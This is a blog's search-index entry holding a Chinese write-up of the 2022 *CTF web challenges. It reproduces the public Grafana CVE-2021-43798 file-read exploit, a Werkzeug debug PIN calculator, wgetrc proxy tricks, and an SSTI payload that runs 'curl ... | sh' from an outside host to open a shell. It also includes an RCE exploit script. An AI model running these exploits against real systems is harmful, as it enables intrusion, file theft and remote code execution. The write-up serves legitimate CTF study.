<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022_star_ctf复现</title>
      <link href="/post/0.html"/>
      <url>/post/0.html</url>
      
        <content type="html"><![CDATA[<h1 id="star-ctf"><a href="#star-ctf" class="headerlink" title="star ctf"></a>star ctf</h1><h1 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h1><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a><a href="http://blog.seals6.top/index.php/archives/18/">链接</a></h4><h4 id="一键化工具"><a href="#一键化工具" class="headerlink" title="一键化工具"></a><a href="https://github.com/A-D-Team/grafanaExp">一键化工具</a></h4><p>进入题目，查看grafana的版本，上网进行查找发现<code>CVE-2021-43798 Grafana 任意文件读取漏洞</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#插件列表</span></span><br><span class="line">alertmanager</span><br><span class="line">grafana</span><br><span class="line">loki</span><br><span class="line">postgres</span><br><span class="line">grafana-azure-monitor-datasource</span><br><span class="line"><span class="keyword">mixed</span></span><br><span class="line">prometheus</span><br><span class="line">cloudwatch</span><br><span class="line">graphite</span><br><span class="line">mssql</span><br><span class="line">tempo</span><br><span class="line">dashboard</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">testdata</span><br><span class="line">elasticsearch</span><br><span class="line">jaeger</span><br><span class="line">opentsdb</span><br><span class="line">zipkin</span><br><span class="line">alertGroups</span><br><span class="line">bargauge</span><br><span class="line">debug</span><br><span class="line">graph</span><br><span class="line">live</span><br><span class="line">piechart</span><br><span class="line">status-history</span><br><span class="line">timeseries</span><br><span class="line">alertlist</span><br><span class="line">candlestick</span><br><span class="line">gauge</span><br><span class="line">heatmap</span><br><span class="line">logs</span><br><span class="line">pluginlist</span><br><span class="line">table</span><br><span class="line">welcome</span><br><span class="line">annolist</span><br><span class="line">canvas</span><br><span class="line">geomap</span><br><span class="line">histogram</span><br><span class="line">news</span><br><span class="line">stat</span><br><span class="line">table-old</span><br><span class="line">xychart</span><br><span class="line">barchart</span><br><span class="line">dashlist</span><br><span class="line">gettingstarted</span><br><span class="line">icon</span><br><span class="line">nodeGraph</span><br><span class="line">state-timeline</span><br><span class="line">text</span><br></pre></td></tr></table></figure><p>现成的POC</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read</span></span><br><span class="line"><span class="comment"># Date: 08/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: s1gh</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://grafana.com/</span></span><br><span class="line"><span class="comment"># Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p</span></span><br><span class="line"><span class="comment"># Version: V8.0.0-beta1 through V8.3.0</span></span><br><span class="line"><span class="comment"># Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-43798</span></span><br><span class="line"><span class="comment"># Tested on: Debian 10</span></span><br><span class="line"><span class="comment"># References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line">plugin_list = [</span><br><span class="line">    <span class="string">&quot;alertlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;annolist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;barchart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bargauge&quot;</span>,</span><br><span class="line">    <span class="string">&quot;candlestick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cloudwatch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dashlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gauge&quot;</span>,</span><br><span class="line">    <span class="string">&quot;geomap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gettingstarted&quot;</span>,</span><br><span class="line">    <span class="string">&quot;grafana-azure-monitor-datasource&quot;</span>,</span><br><span class="line">    <span class="string">&quot;graph&quot;</span>,</span><br><span class="line">    <span class="string">&quot;heatmap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;histogram&quot;</span>,</span><br><span class="line">    <span class="string">&quot;influxdb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jaeger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;logs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;loki&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mssql&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">    <span class="string">&quot;news&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nodeGraph&quot;</span>,</span><br><span class="line">    <span class="string">&quot;opentsdb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;piechart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pluginlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;postgres&quot;</span>,</span><br><span class="line">    <span class="string">&quot;prometheus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stackdriver&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;state-timeline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status-histor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;table&quot;</span>,</span><br><span class="line">    <span class="string">&quot;table-old&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tempo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;testdata&quot;</span>,</span><br><span class="line">    <span class="string">&quot;text&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timeseries&quot;</span>,</span><br><span class="line">    <span class="string">&quot;welcome&quot;</span>,</span><br><span class="line">    <span class="string">&quot;zipkin&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">args</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    headers = &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_to_read = <span class="built_in">input</span>(<span class="string">&#x27;Read file &gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = args.host + <span class="string">&#x27;/public/plugins/&#x27;</span> + choice(plugin_list) + <span class="string">&#x27;/../../../../../../../../../../../../..&#x27;</span> + file_to_read</span><br><span class="line">            req = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url, headers=headers)</span><br><span class="line">            prep = req.prepare()</span><br><span class="line">            prep.url = url</span><br><span class="line">            r = s.send(prep, verify=<span class="literal">False</span>, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Plugin file not found&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-] File not found\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                    <span class="built_in">print</span>(r.text)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[-] Something went wrong.&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Request timed out. Please check your host settings.\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-H&#x27;</span>,dest=<span class="string">&#x27;host&#x27;</span>,required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Target host&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exploit(args)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">          </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到&#x2F;etc&#x2F;grafana&#x2F;grafana.ini下的信息之后，登录后台，远程加载mysql，获得flag</p><h1 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h1><p>考点：</p><p>sql注入的文件读取操作</p><p>python3.8  flask的pin码利用</p><p>wp:</p><p>存在sql注入，官方wp说这里存在提示，堆叠注入，然后根据报错盲猜这个题目需要算pin码</p><p>那就直接读文件，这里可以使用联合注入，那就查看一些配置信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select @@<span class="keyword">global</span>.secure_file_priv;</span><br><span class="line"><span class="comment">#/var/lib/mysql-files/ 存在限制</span></span><br><span class="line">select @@<span class="keyword">global</span>.local_infile;</span><br><span class="line"><span class="comment"># 1 可以利用load data local infile; 写数据到新建表里面</span></span><br></pre></td></tr></table></figure><h4 id="共需要六个要素"><a href="#共需要六个要素" class="headerlink" title="共需要六个要素"></a>共需要六个要素</h4><ul><li><p><strong>username 代码中(或者终端下)通过getpass.getuser()获取，文件中(命令执行)通过读取&#x2F;etc&#x2F;passwd来猜测</strong></p></li><li><p><strong>modname 代码中也可以通过getattr(mod,”</strong><strong><strong>file</strong></strong><strong>“,None)读取  默认值为flask.app</strong></p></li><li><p><strong>appname 默认值为Flask</strong></p></li><li><p><strong>moddir 代码中通过getattr(app,”</strong><strong><strong>file</strong></strong><strong>“,None)，实际上可以通过报错得到</strong></p></li><li><p><strong>uuidnode 代码中可以通过uuid.getnode()读取，文件中通过读取&#x2F;sysclass&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转为10进制参与计算</strong></p></li><li><p><strong>machine_id代码中通过合并3个文件的指定值确定，文件中获取</strong></p><ol><li><strong>&#x2F;ect&#x2F;machine-id</strong></li><li><strong>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</strong></li><li><strong>proc&#x2F;self&#x2F;cgroup  (docker环境下一般只读后两个文件，必要时候读三个文件)</strong></li></ol></li></ul><p>这道题目使用的是“&#x2F;ect&#x2F;machine-id + proc&#x2F;self&#x2F;cgroup” 官方给的解释是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Werkzeug的更新给pin码的计算方式带来了变化,新版本是从/etc/machine-<span class="built_in">id</span>、/proc/sys/kernel/random/boot_id中读到一个值后立即<span class="keyword">break</span>，然后和/proc/self/cgroup中的<span class="built_in">id</span>值拼接，使用拼接的值来计算pin码</span><br><span class="line"><span class="comment">#简单来说就是从/etc/machine-id、/proc/sys/kernel/random/boot_id中随机读一个然后和/proc/self/cgroup 组合</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">username, eth0, machine_id, cgroup</span>):</span><br><span class="line">    probably_public_bits = [</span><br><span class="line">    username,<span class="comment"># username ok</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>, <span class="comment"># ok</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span> <span class="comment">#ok,</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># ok</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        eth0,<span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">        machine_id + cgroup</span><br><span class="line">        <span class="comment"># &#x27;7cb84391-1303-4564-8eff-ef7571804198327e92627edf30f63fde916e3c3017aea76eeb876265a726270a575d391eeb4a&#x27;# machine-id</span></span><br><span class="line">        <span class="comment"># /etc/machine-id + /proc/self/cgroup</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv =<span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">    <span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve(<span class="string">&#x27;ctf&#x27;</span>, <span class="string">&#x27;2485377957891&#x27;</span>, <span class="string">&#x27;1cc402dd0e11d5ae18db04a6de87223d&#x27;</span>, <span class="string">&#x27;60e5fcb0d2096a11bb18121875744005aa677b8a9af551fbb5aea438ede44809&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h1><p><a href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html">Wgetrc Commands</a>  通过在线查看linux命令的文档 <a href="https://command-not-found.com/wget">链接</a></p><p><a href="http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html">Environment Variables Understood by Glibc Toolchains</a>  Linux环境变量文档</p><h4 id="非预期一：-利用wgetrc的http-proxy代理到自己的vps上，然后下载一个一模一样的forecast-txt即可"><a href="#非预期一：-利用wgetrc的http-proxy代理到自己的vps上，然后下载一个一模一样的forecast-txt即可" class="headerlink" title="非预期一： 利用wgetrc的http_proxy代理到自己的vps上，然后下载一个一模一样的forecast.txt即可"></a>非预期一： 利用wgetrc的http_proxy代理到自己的vps上，然后下载一个一模一样的<code>forecast.txt</code>即可</h4><p>wp：</p><p>forecast.txt</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http_proxy=http://<span class="number">39.106</span><span class="number">.87</span><span class="number">.143</span>:<span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后在<code>/lotto</code>页面下提交环境变量<code>wgetrc</code>和<code>forecast.txt</code>同时在自己的vps上仿照lotto的app.py，自己写一个代理</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    lotto = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        n = <span class="built_in">str</span>(secrets.randbelow(<span class="number">40</span>))</span><br><span class="line">        lotto.append(n)</span><br><span class="line">  </span><br><span class="line">    r = <span class="string">&#x27;\n&#x27;</span>.join(lotto)</span><br><span class="line">    r = <span class="string">&#x27;http_proxy =http://39.106.87.143:8888&#x27;</span>  <span class="comment"># 这里是通过代理获得的内容，与上传的内容一样</span></span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=lotto_result.txt&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><h4 id="非预期二：首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用PATH，使得wget异常（lotto没有改变），这样读取的lotto（还是原来的）就能与forecast相等，即可获得flag。"><a href="#非预期二：首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用PATH，使得wget异常（lotto没有改变），这样读取的lotto（还是原来的）就能与forecast相等，即可获得flag。" class="headerlink" title="非预期二：首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用PATH，使得wget异常（lotto没有改变），这样读取的lotto（还是原来的）就能与forecast相等，即可获得flag。"></a>非预期二：<strong>首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用</strong><code>PATH</code>，使得wget异常（lotto没有改变），这样读取的lotto（还是原来的）就能与forecast相等，即可获得flag。</h4><p>网上借鉴师傅们的exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8880/&#x27;</span></span><br><span class="line"></span><br><span class="line">requests.post(url+<span class="string">&#x27;lotto&#x27;</span>,data=&#123;<span class="string">&quot;lotto_key&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;lotto_value&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;)</span><br><span class="line">r = requests.get(url+<span class="string">&#x27;result&#x27;</span>).text.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).split(<span class="string">&quot;&lt;p&gt;&quot;</span>)[-<span class="number">1</span>].split(<span class="string">&quot;&lt;/p&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(r)</span><br><span class="line"></span><br><span class="line">requests.post(url+<span class="string">&#x27;forecast&#x27;</span>,files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">r = requests.post(url+<span class="string">&#x27;lotto&#x27;</span>,data=&#123;<span class="string">&quot;lotto_key&quot;</span>:<span class="string">&quot;PATH&quot;</span>,<span class="string">&quot;lotto_value&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h1><h4 id="非预期一：利用wgetrc的http-proxy配合ouput-document，写ssti到本地的templates目录"><a href="#非预期一：利用wgetrc的http-proxy配合ouput-document，写ssti到本地的templates目录" class="headerlink" title="非预期一：利用wgetrc的http_proxy配合ouput_document，写ssti到本地的templates目录"></a>非预期一：利用wgetrc的http_proxy配合ouput_document，写ssti到本地的templates目录</h4><p>forecast.txt：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http_proxy = http://<span class="number">39.106</span><span class="number">.87</span><span class="number">.143</span>:<span class="number">8888</span></span><br><span class="line">output_document = templates/index.html</span><br><span class="line"></span><br><span class="line">ps:</span><br><span class="line">output_document = file</span><br><span class="line"><span class="type">Set</span> the output filename—the same <span class="keyword">as</span> ‘-O file’.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">注意到官方的wp解释：wget请求添加了--content-disposition -N (new) 参数，说明请求的保存文件名将由服务方提供方指定的文件名决定，并可以覆盖原有的</span><br><span class="line">文件这里为什么还要用output_document呢？是因为--content-disposition -N参数虽然可以进行覆盖但是不能跨目录覆盖</span><br></pre></td></tr></table></figure><p>那又为什么要进行跨目录覆盖呢，官方的解释：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">题目使用gunicorn部署，app.py在改变的情况下并不会实时加载。但gunicorn使用一种pre-forked worker的机制，当某一个worker超时以后，就会让gunicorn重启该worker</span><br></pre></td></tr></table></figure><p>vps上的index.html：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;curl https://www.your-shell.com/39.106.87.143:8888 |sh&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">      r = f.read()</span><br><span class="line">      response = make_response(r)</span><br><span class="line">      response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">      response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=index.html&#x27;</span></span><br><span class="line">      <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>操作跟上面的就一样了，这里就不写了</p><h4 id="非预期二：利用WGETRC配合http-proxy和output-document，覆盖本地的wget应用，然后利用wget完成RCE。"><a href="#非预期二：利用WGETRC配合http-proxy和output-document，覆盖本地的wget应用，然后利用wget完成RCE。" class="headerlink" title="非预期二：利用WGETRC配合http_proxy和output_document，覆盖本地的wget应用，然后利用wget完成RCE。"></a>非预期二：<strong>利用</strong><code>WGETRC</code>配合<code>http_proxy</code>和<code>output_document</code>，覆盖本地的wget应用，然后利用wget完成RCE。</h4><p>这个复现意义不大这里就说了</p><h2 id="官方通杀wp："><a href="#官方通杀wp：" class="headerlink" title="官方通杀wp："></a>官方通杀wp：</h2><p>翻阅Linux环境变量文档<code>http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html</code>中的Network Settings发现HOSTALIASES可以设置shell中的hosts文件，利用hosts文件解析lotto到我们自己添加的域名，然后覆盖掉app.py</p><p>这里没有域名的还可以使用之前的WGETRC的http_proxy，然后通让覆盖掉app.py</p><p>同样的即使是覆盖掉了app.py但是不进行加载的，就无法进行rce怎么办？</p><p>这里因为worker的数量较小，可以直接令其超时重新加载</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span> &amp;</span><br><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span> &amp;</span><br><span class="line">timeout <span class="number">50</span> nc ip <span class="number">53000</span></span><br></pre></td></tr></table></figure><p><strong>最终worker重新加载</strong><code>app.py</code>，就可以完成RCE了，读取flag即可。参考官方完整POC如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://124.223.208.221:53000/&#x27;</span></span><br><span class="line">url_upload = base_url + <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = s.post(url=url_upload, proxies=proxies, files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;hosts&quot;</span>, <span class="built_in">open</span>(<span class="string">&#x27;hosts&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">url_env = base_url + <span class="string">&#x27;lotto&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;lotto_key&#x27;</span>: <span class="string">&#x27;HOSTALIASES&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lotto_value&#x27;</span>: <span class="string">&#x27;/app/guess/forecast.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url=url_env, data=data)</span><br><span class="line"></span><br><span class="line">subprocess.Popen(<span class="string">&#x27;./exploit.sh&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># os.system(&#x27;./exploit.sh&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">53</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url_shell = base_url + <span class="string">&#x27;test?a=env&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(url_shell)</span><br><span class="line">    r = s.get(url_shell)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;*ctf&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 2022 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
